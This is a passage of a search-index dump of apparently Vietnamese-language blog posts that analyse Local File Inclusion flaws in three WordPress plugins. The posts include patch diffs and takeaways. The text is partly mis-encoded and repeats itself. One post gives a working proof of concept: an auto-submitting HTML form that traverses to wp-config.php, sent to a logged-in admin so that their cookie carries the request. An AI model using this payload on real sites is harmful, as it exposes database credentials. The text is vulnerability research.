Document Step 2\rG·ª≠i link ƒë·∫øn trang web cho admin ho·∫∑c ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn C·∫£nh b√°o L·ªó h·ªïng n√†y ch·ªâ khai th√°c ƒë∆∞·ª£c tr√™n Windows, v√¨ h√†m file_exists() x·ª≠ l√Ω ƒë∆∞·ªùng d·∫´n kh√°c nhau gi·ªØa hai h·ªá ƒëi·ªÅu h√†nh. Tr√™n Linux, n·∫øu ƒë∆∞·ªùng d·∫´n ch·ª©a th∆∞ m·ª•c kh√¥ng t·ªìn t·∫°i, h√†m s·∫Ω tr·∫£ v·ªÅ false. Trong khi ƒë√≥, tr√™n Windows, c√πng ƒë∆∞·ªùng d·∫´n ƒë√≥ l·∫°i c√≥ th·ªÉ tr·∫£ v·ªÅ true, khi·∫øn ƒëi·ªÅu ki·ªán ki·ªÉm tra b·ªã b·ªè qua v√† l·ªó h·ªïng c√≥ th·ªÉ k√≠ch ho·∫°t. ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#step-1"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rT·∫°o trang web c√≥ form, t·ª± ƒë·ªông g·ª≠i request v·ªõi LFI payload \u003c!DOCTYPE html\u003e Document Step 2\rG·ª≠i link ƒë·∫øn trang web cho admin ho·∫∑c ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn C·∫£nh b√°o L·ªó h·ªïng n√†y ch·ªâ khai th√°c ƒë∆∞·ª£c tr√™n Windows, v√¨ h√†m file_exists() x·ª≠ l√Ω ƒë∆∞·ªùng d·∫´n kh√°c nhau gi·ªØa hai h·ªá ƒëi·ªÅu h√†nh. Tr√™n Linux, n·∫øu ƒë∆∞·ªùng d·∫´n ch·ª©a th∆∞ m·ª•c kh√¥ng t·ªìn t·∫°i, h√†m s·∫Ω tr·∫£ v·ªÅ false. Trong khi ƒë√≥, tr√™n Windows, c√πng ƒë∆∞·ªùng d·∫´n ƒë√≥ l·∫°i c√≥ th·ªÉ tr·∫£ v·ªÅ true, khi·∫øn ƒëi·ªÅu ki·ªán ki·ªÉm tra b·ªã b·ªè qua v√† l·ªó h·ªïng c√≥ th·ªÉ k√≠ch ho·∫°t. ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#step-2"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rPhi√™n b·∫£n ‚â§ 2025.1.0 c·ªßa WP REST Cache cho ph√©p Local File Inclusion qua tham s·ªë sub. B·∫£n v√° 2025.1.1 gi·∫£i quy·∫øt b·∫±ng c√°ch ki·ªÉm tra v·ªã tr√≠ file tr∆∞·ªõc khi include ‚Äî ƒë·∫£m b·∫£o file ch·ªâ ƒë∆∞·ª£c n·∫°p n·∫øu n·∫±m trong th∆∞ m·ª•c partials, t·ª´ ƒë√≥ lo·∫°i b·ªè kh·∫£ nƒÉng path traversal/LFI. ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rL·∫•y d·ªØ li·ªáu tr·ª±c ti·∫øp t·ª´ request v√† gh√©p v√†o ƒë∆∞·ªùng d·∫´n file l√† r·ªßi ro LFI. Lu√¥n x√°c th·ª±c v·ªã tr√≠ th·ª±c t·∫ø c·ªßa file (ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi) tr∆∞·ªõc khi include. Ki·ªÉm so√°t ph·∫°m vi file b·∫±ng so s√°nh th∆∞ m·ª•c ƒë√≠ch (whitelist) hi·ªáu qu·∫£ h∆°n ch·ªâ sanitize k√Ω t·ª±. Ki·ªÉm tra tr√™n nhi·ªÅu n·ªÅn t·∫£ng (Windows/Linux) v√¨ h√†nh vi h√†m file c√≥ th·ªÉ kh√°c nhau. ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Inclusion/Path traversal ‚Äî Hacktrick WordPress WP REST Cache Plugin \u003c= 2025.1.0 is vulnerable to Local File Inclusion ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress LatePoint Plugin.","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin LatePoint phi√™n b·∫£n ‚â§ 5.1.93 ch·ª©a l·ªó h·ªïng Local File Inclusion cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-6715 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 5.1.93 Patched Versions: 5.1.94 CVSS severity: High (8.1) Required Privilege: Unauthenticated Product: WordPress LatePoint Plugin ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - LatePoint: 5.1.93 (vulnerable) v√† 5.1.94 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rB·∫£n l·ªói: function render($view, $layout = 'none', $extra_vars = array()){ $this-\u003evars['route_name'] = $this-\u003eroute_name; extract($extra_vars); extract($this-\u003evars); ob_start(); if($layout != 'none'){ // rendering layout, view variable will be passed and used in layout file include LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $this-\u003eadd_extension($layout, '.php'); }else{ include $this-\u003eadd_extension($view, '.php'); } $response_html = ob_get_clean(); return $response_html; } Trong phi√™n b·∫£n l·ªói, h√†m render() g·∫Øn .php v√†o $layout v√† include tr·ª±c ti·∫øp m√† kh√¥ng ki·ªÉm tra, d·∫´n ƒë·∫øn Local File Inclusion (LFI) n·∫øu $layout b·ªã ki·ªÉm so√°t t·ª´ ƒë·∫ßu v√†o. B·∫£n v√°: function render($view, $layout = 'none', $extra_vars = array()){ $this-\u003evars['route_name'] = $this-\u003eroute_name; extract($extra_vars); extract($this-\u003evars); ob_start(); if($layout != 'none'){ $layout_path = $this-\u003eget_safe_layout_path($layout); // rendering layout, view variable will be passed and used in layout file if($layout_path){ include $layout_path; }else{ __('Invalid layout', 'latepoint'); } }else{ include $this-\u003eadd_extension($view, '.php'); } $response_html = ob_get_clean(); return $response_html; } private function get_safe_layout_path($layout) { // 1. Remove any path separators and null bytes $layout = str_replace(['/', '\\\\', \"\\0\"], '', $layout); // 2. Remove any dots to prevent directory traversal $layout = str_replace('.', '', $layout); // 3. Only allow alphanumeric, underscore, and hyphen $layout = preg_replace('/[^a-zA-Z0-9_-]/', '', $layout); // 4. Construct the full path $layout_file = $this-\u003eadd_extension($layout, '.php'); $full_path = LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $layout_file; // 5. Use realpath to resolve any remaining traversal attempts $real_path = realpath($full_path); $base_path = realpath(LATEPOINT_VIEWS_LAYOUTS_ABSPATH); // 6. Ensure the resolved path is within the layouts directory if ($real_path \u0026\u0026 $base_path \u0026\u0026 strpos($real_path, $base_path) === 0) { return $real_path; } return false; } B·∫£n v√° ƒë√£ th√™m get_safe_layout_path() ƒë·ªÉ lo·∫°i b·ªè /, \\, . v√† null byte; ch·ªâ cho ph√©p [A-Za-z0-9_-]; x√¢y d·ª±ng ƒë∆∞·ªùng d·∫´n, d√πng realpath() v√† so s√°nh v·ªõi LATEPOINT_VIEWS_LAYOUTS_ABSPATH. N·∫øu h·ª£p l·ªá m·ªõi include, ngƒÉn ch·∫∑n LFI. ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rH√†m render() ƒë∆∞·ª£c g·ªçi t·∫°i 12 v·ªã tr√≠ kh√°c nhau, n√™n vi·ªác trace th·ªß c√¥ng s·∫Ω r·∫•t m·∫•t th·ªùi gian. 12 v·ªã tr√≠ g·ªçi h√†m render() ƒê·ªÉ t·ªëi ∆∞u, ta s·ª≠ d·ª•ng debugger: ƒê·∫∑t breakpoint trong h√†m render(). Th·ª±c hi·ªán l·∫ßn l∆∞·ª£t c√°c thao t√°c trong giao di·ªán (UI). M·ªói khi render() ƒë∆∞·ª£c g·ªçi, ch∆∞∆°ng tr√¨nh s·∫Ω t·∫°m d·ª´ng t·∫°i breakpoint v√† highlight d√≤ng code t∆∞∆°ng ·ª©ng, gi√∫p x√°c ƒë·ªãnh nhanh lu·ªìng g·ªçi h√†m. Video debugger nh·∫£y ƒë·∫øn break point üëâ Khi truy c·∫≠p endpoint http://localhost/wp-admin/admin.php?page=latepoint\u0026route_name=calendars__view v·ªõi route name l√† c√°c submenu c·ªßa plugin th√¨ render() ƒë∆∞·ª£c g·ªçi v·ªõi layout m·∫∑c ƒë·ªãnh l√† admin Layout m·∫∑c ƒë·ªãnh Quan s√°t callstack, ta th·∫•y ƒë∆∞·ª£c lu·ªìng g·ªçi h√†m ƒë·∫øn render() Lu·ªìng g·ªçi h√†m trong callstack function format_render_return($view_name, $extra_vars = array(), $json_return_vars = array(), $from_shared_folder = false){ $html = ''; if($this-\u003eget_return_format() == 'json'){ if(is_array($view_name)) $view_name = $view_name['json_view_name']; $response_html = $this-\u003erender($this-\u003eget_view_uri($view_name, $from_shared_folder), 'none', $extra_vars); $this-\u003esend_json(array_merge(array('status' =\u003e LATEPOINT_STATUS_SUCCESS, 'message' =\u003e $response_html), $json_return_vars)); }else{ if(is_array($view_name)) $view_name = $view_name['html_view_name']; $this-\u003eextra_css_classes[] = $this-\u003egenerate_css_class($view_name); $this-\u003evars['extra_css_classes'] = $this-\u003eextra_css_classes; $html = $this-\u003erender($this-\u003eget_view_uri($view_name, $from_shared_folder), $this-\u003eget_layout(), $extra_vars); } return $html; } render() ƒë∆∞·ª£c format_render_return() g·ªçi khi get_return_format() kh√¥ng ph·∫£i l√† json, m·∫∑c ƒë·ªãnh n√≥ l√† html $return_format = 'html' ... function get_return_format(){ return $this-\u003ereturn_format; } layout m√† ta c·∫ßn quan t√¢m l√† gi√° tr·ªã tr·∫£ v·ªÅ c·ªßa get_layout() =\u003e c√≥ get_layout() th√¨ c≈©ng s·∫Ω c√≥ set_layout(), ta t√¨m v·ªõi t·ª´ kh√≥a set_layout trong c√πng file ƒë·ªÉ xem gi√° tr·ªã layout ƒë∆∞·ª£c set nh∆∞ n√†o. $layout = 'admin' ... function set_layout($layout = 'admin'){ if(isset($this-\u003eparams['layout'])){ $this-\u003elayout = $this-\u003eparams['layout']; }else{ $this-\u003elayout = $layout; } } Bi·∫øn $layout ƒë∆∞·ª£c g√°n gi√° tr·ªã m·∫∑c ƒë·ªãnh l√† 'admin', t∆∞∆°ng ·ª©ng v·ªõi layout m√† ta ƒë√£ ph√¢n t√≠ch tr∆∞·ªõc ƒë√≥. H√†m set_layout() c√≥ nhi·ªám v·ª• x√°c ƒë·ªãnh layout s·∫Ω s·ª≠ d·ª•ng: N·∫øu trong $this-\u003eparams c√≥ t·ªìn t·∫°i tham s·ªë layout, th√¨ h√†m s·∫Ω d√πng gi√° tr·ªã ƒë√≥. Ng∆∞·ª£c l·∫°i, n·∫øu kh√¥ng c√≥, n√≥ s·∫Ω g√°n layout m·∫∑c ƒë·ªãnh ('admin'). Ta ti·∫øp t·ª•c t·∫≠n d·ª•ng s·ª©c m·∫°nh c·ªßa debugger, quan s√°t bi·∫øn $params Gi√° tr·ªã c·ªßa $params $params bao g·ªìm 2 key l√† page v√† route_name t∆∞∆°ng ƒë∆∞∆°ng v·ªõi params string khi ta truy c·∫≠p endpoint http://localhost/wp-admin/admin.php?page=latepoint\u0026route_name=calendars__view üëâ Nh∆∞ v·∫≠y layout c≈©ng l√† param ƒë∆∞·ª£c truy·ªÅn trong URL, ta t·∫≠n d·ª•ng ƒëi·ªÅu n√†y ƒë·ªÉ khai th√°c. Th·ª≠ truy c·∫≠p endpoint tr√™n v·ªõi layout param GET /wp-admin/admin.php?page=latepoint\u0026route_name=calendars__view\u0026layout=payload HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-admin/admin.php?page=latepoint Connection: keep-alive Cookie: wordpress_86a9106ae65537651a8e456835b316ab=admin%7C1760967480%7CoCVvKc0bJQfyBklDsH6H9DopdAB5cs1Sto11eNkRdYj%7Cc08cb50e24c24f218212642e90eebec4ec8ab1c3fb72a2443f62f3c27e253edd; wp-settings-time-1=1760795495; language=en; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1760967480%7CoCVvKc0bJQfyBklDsH6H9DopdAB5cs1Sto11eNkRdYj%7C2e46c824d8ba0f581459540ee6553fac38b1af797e42b03957dd3ab2a79a4175 $layout ƒë√£ ƒë∆∞·ª£c ta ho√†n to√†n ki·ªÉm so√°t $layout ƒë∆∞·ª£c ki·ªÉm so√°t ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rT·∫°o trang web c√≥ form, t·ª± ƒë·ªông g·ª≠i request v·ªõi LFI payload \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://localhost:80/wp-admin/admin.php\" method=\"get\"\u003e \u003cinput type=\"text\" name=\"page\" value=\"latepoint\"\u003e \u003cinput type=\"text\" name=\"route_name\" value=\"calendars__view\"\u003e \u003cinput type=\"text\" name=\"layout\" value=\"../../../../../../wp-config\"\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit() \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Step 2\rG·ª≠i link ƒë·∫øn trang web cho admin ho·∫∑c ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn Result: Debugger ƒë√£ nh·∫£y ƒë·∫øn wp-config.php K·∫øt qu·∫£ LFI th√†nh c√¥ng Th√¥ng tin\rV√¨ ƒë√¢y l√† CVE ƒë∆∞·ª£c c√¥ng b·ªë Unauthenticated, n√™n ta t·∫≠n d·ª•ng plugin kh√¥ng check nonce ƒë·ªÉ ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p truy c·∫≠p v√†o link trang web ƒë·ªôc h·∫°i r·ªìi t·ª± g·ª≠i request ƒë·∫øn trang WordPress ƒë√≥ k√®m theo cookie. ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rT·∫°o trang web c√≥ form, t·ª± ƒë·ªông g·ª≠i request v·ªõi LFI payload \u003c!DOCTYPE html\u003e Document Step 2\rG·ª≠i link ƒë·∫øn trang web cho admin ho·∫∑c ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn Result: Debugger ƒë√£ nh·∫£y ƒë·∫øn wp-config.php K·∫øt qu·∫£ LFI th√†nh c√¥ng Th√¥ng tin\rV√¨ ƒë√¢y l√† CVE ƒë∆∞·ª£c c√¥ng b·ªë Unauthenticated, n√™n ta t·∫≠n d·ª•ng plugin kh√¥ng check nonce ƒë·ªÉ ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p truy c·∫≠p v√†o link trang web ƒë·ªôc h·∫°i r·ªìi t·ª± g·ª≠i request ƒë·∫øn trang WordPress ƒë√≥ k√®m theo cookie. ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#step-1"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rT·∫°o trang web c√≥ form, t·ª± ƒë·ªông g·ª≠i request v·ªõi LFI payload \u003c!DOCTYPE html\u003e Document Step 2\rG·ª≠i link ƒë·∫øn trang web cho admin ho·∫∑c ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn Result: Debugger ƒë√£ nh·∫£y ƒë·∫øn wp-config.php K·∫øt qu·∫£ LFI th√†nh c√¥ng Th√¥ng tin\rV√¨ ƒë√¢y l√† CVE ƒë∆∞·ª£c c√¥ng b·ªë Unauthenticated, n√™n ta t·∫≠n d·ª•ng plugin kh√¥ng check nonce ƒë·ªÉ ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p truy c·∫≠p v√†o link trang web ƒë·ªôc h·∫°i r·ªìi t·ª± g·ª≠i request ƒë·∫øn trang WordPress ƒë√≥ k√®m theo cookie. ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#step-2"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rPhi√™n b·∫£n ‚â§ 5.1.93 c·ªßa LatePoint cho ph√©p LFI v√¨ tham s·ªë layout kh√¥ng ƒë∆∞·ª£c x√°c th·ª±c tr∆∞·ªõc khi include(), d·∫´n t·ªõi kh·∫£ nƒÉng ƒë·ªçc t·ªáp c·ª•c b·ªô (v√≠ d·ª• wp-config.php). L·ªó h·ªïng ƒë∆∞·ª£c v√° trong 5.1.94 b·∫±ng c√°ch l·ªçc k√Ω t·ª±, d√πng realpath() v√† gi·ªõi h·∫°n th∆∞ m·ª•c h·ª£p l·ªá. ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rƒê√¢y l√† LFI (ƒë·ªçc file) ‚Äî kh√¥ng c√≥ b·∫±ng ch·ª©ng RCE trong PoC. Tham s·ªë ƒëi·ªÅu khi·ªÉn ƒë∆∞·ªùng d·∫´n ph·∫£i ƒë∆∞·ª£c sanitize + canonicalize tr∆∞·ªõc khi d√πng. D√πng realpath() v√† ki·ªÉm tra base dir ƒë·ªÉ ngƒÉn traversal. Kh√¥ng include tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ request; x√¢y h√†m an to√†n nh∆∞ get_safe_layout_path(). ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:4:3","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Inclusion/Path traversal ‚Äî Hacktrick WordPress LatePoint Plugin \u003c= 5.1.93 is vulnerable to Local File Inclusion ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Hide My WP Ghost Plugin.","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Hide My WP Ghost phi√™n b·∫£n ‚â§ 5.4.01 ch·ª©a l·ªó h·ªïng Local File Inclusion cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-26909 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 5.4.01 Patched Versions: 5.4.02 CVSS severity: High (9.6) Required Privilege: Unauthenticated Product: WordPress Hide My WP Ghost Plugin ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Hide My WP Ghost: 5.3.02 (vulnerable) v√† 5.4.02 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rB·∫£n l·ªói: public function getOriginalUrl( $url ) { // Build the rewrite rules if they are not already built if ( empty( $this-\u003e_rewrites ) ) { $this-\u003ebuildRedirect(); } // Parse the URL components $parse_url = wp_parse_url( $url ); // Get the home root path $path = wp_parse_url( home_url(), PHP_URL_PATH ); // Backslash the paths if ( $path \u003c\u003e '' ) { $parse_url['path'] = preg_replace( '/^' . preg_quote( $path, '/' ) . '/', '', $parse_url['path'] ); } // Replace paths to original based on rewrite rules if ( isset( $this-\u003e_rewrites['from'] ) \u0026\u0026 isset( $this-\u003e_rewrites['to'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['from'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['to'] ) ) { $parse_url['path'] = preg_replace( $this-\u003e_rewrites['from'], $this-\u003e_rewrites['to'], $parse_url['path'], 1 ); } // Default to https if the scheme is not set if ( ! isset( $parse_url['scheme'] ) ) { $parse_url['scheme'] = 'https'; } // Reconstruct the URL if ( isset( $parse_url['port'] ) \u0026\u0026 $parse_url['port'] \u003c\u003e 80 ) { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . ':' . $parse_url['port'] . $path . $parse_url['path']; } else { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . $path . $parse_url['path']; } // Append query string if present if ( isset( $parse_url['query'] ) \u0026\u0026 ! empty( $parse_url['query'] ) ) { $query = $parse_url['query']; $query = str_replace( array( '?', '%3F' ), '\u0026', $query ); $new_url .= ( ! strpos( $new_url, '?' ) ? '?' : '\u0026' ) . $query; } // Return the constructed URL return $new_url; } H√†m getOriginalUrl() d√πng ƒë·ªÉ ph√¢n t√≠ch v√† t√°i t·∫°o l·∫°i URL g·ªëc d·ª±a tr√™n c√°c quy t·∫Øc rewrite trong h·ªá th·ªëng. Trong phi√™n b·∫£n l·ªói, gi√° tr·ªã $new_url kh√¥ng ƒë∆∞·ª£c l√†m s·∫°ch tr∆∞·ªõc khi tr·∫£ v·ªÅ, cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n ƒë∆∞·ªùng d·∫´n ƒë·ªôc h·∫°i nh∆∞ ../../etc/passwd d·∫´n ƒë·∫øn nguy c∆° LFI. B·∫£n v√°: public function getOriginalUrl( $url ) { // Build the rewrite rules if they are not already built if ( empty( $this-\u003e_rewrites ) ) { $this-\u003ebuildRedirect(); } // Parse the URL components $parse_url = wp_parse_url( $url ); // Only if there is a path to change if( !isset( $parse_url['path'] ) ) { return $url; } // Get the home root path $path = wp_parse_url( home_url(), PHP_URL_PATH ); // Backslash the paths if ( $path \u003c\u003e '' ) { $parse_url['path'] = preg_replace( '/^' . preg_quote( $path, '/' ) . '/', '', $parse_url['path'] ); } // Replace paths to original based on rewrite rules if ( isset( $this-\u003e_rewrites['from'] ) \u0026\u0026 isset( $this-\u003e_rewrites['to'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['from'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['to'] ) ) { $parse_url['path'] = preg_replace( $this-\u003e_rewrites['from'], $this-\u003e_rewrites['to'], $parse_url['path'], 1 ); } // Default to https if the scheme is not set if ( ! isset( $parse_url['scheme'] ) ) { $parse_url['scheme'] = 'https'; } // Reconstruct the URL if ( isset( $parse_url['port'] ) \u0026\u0026 $parse_url['port'] \u003c\u003e 80 ) { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . ':' . $parse_url['port'] . $path . $parse_url['path']; } else { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . $path . $parse_url['path']; } // Append query string if present if ( isset( $parse_url['query'] ) \u0026\u0026 ! empty( $parse_url['query'] ) ) { $query = $parse_url['query']; $query = str_replace( array( '?', '%3F' ), '\u0026', $query ); $new_url .= ( ! strpos( $new_url, '?' ) ? '?' : '\u0026' ) . $query; } // Return the constructed URL return sanitize_url( $new_url ); } B·∫£n v√° g·ªçi sanitize_url($new_url) tr∆∞·ªõc khi tr·∫£ v·ªÅ, gi√∫p lo·∫°i b·ªè ƒë∆∞·ªùng d·∫´n ho·∫∑c scheme nguy hi·ªÉm, t·ª´ ƒë√≥ ngƒÉn ch·∫∑n kh·∫£ nƒÉng LFI. ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 